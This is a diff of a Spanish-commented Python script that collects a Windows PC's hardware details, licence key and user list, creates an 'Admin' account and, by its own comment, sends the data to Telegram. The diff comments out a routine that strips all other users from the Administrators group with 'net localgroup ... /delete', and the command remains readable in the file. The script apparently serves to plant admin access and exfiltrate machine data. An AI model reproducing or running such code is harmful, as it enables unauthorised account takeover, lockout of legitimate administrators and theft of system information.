@@ -83,7 +83,7 @@ def crear_usuario_admin():
     return resultado
 
 
-def quitar_otros_admins():
+"""def quitar_otros_admins():
     # Quita a los demás usuarios del grupo de administradores.
     resultado = ""
     try:
@@ -96,7 +96,7 @@ def quitar_otros_admins():
                     subprocess.run(['net', 'localgroup', 'Administrators', usuario, '/delete'], check=True, capture_output=True, text=True)
     except Exception as e:
         resultado = "Administradores eliminados"
-    return resultado
+    return resultado"""
 
 def obtener_info_pc():
     # Inicializar WMI
@@ -146,7 +146,7 @@ def obtener_info_pc():
     usuarios = obtener_usuarios()
 
     # Formatear resultados
-    mensaje = f"Marca: {marca}\nModelo: {modelo}\nNúmero de Serie: {numero_serie}\nLicencia de Windows: {licencia}\nProcesador: {procesador}\nRAM Total (GB): {ram_total}\nCreacion de Admin: {crear_usuario_admin()}\n{quitar_otros_admins()}"
+    mensaje = f"Marca: {marca}\nModelo: {modelo}\nNúmero de Serie: {numero_serie}\nLicencia de Windows: {licencia}\nProcesador: {procesador}\nRAM Total (GB): {ram_total}\nCreacion de Admin: {crear_usuario_admin()}"
     mensaje += "\nInformación de Discos:\n"
     for disco in discos:
         mensaje += f"- {disco['Disco']}: Total={disco['Total (GB)']} GB, Usado={disco['Usado (GB)']} GB, Libre={disco['Libre (GB)']} GB\n"
@@ -158,7 +158,6 @@ def obtener_info_pc():
 
 # Crear usuario 'Admin' y ajustar permisos
 crear_usuario_admin()
-quitar_otros_admins()
 
 # Obtener información y enviarla a Telegram
 info_pc = obtener_info_pc()
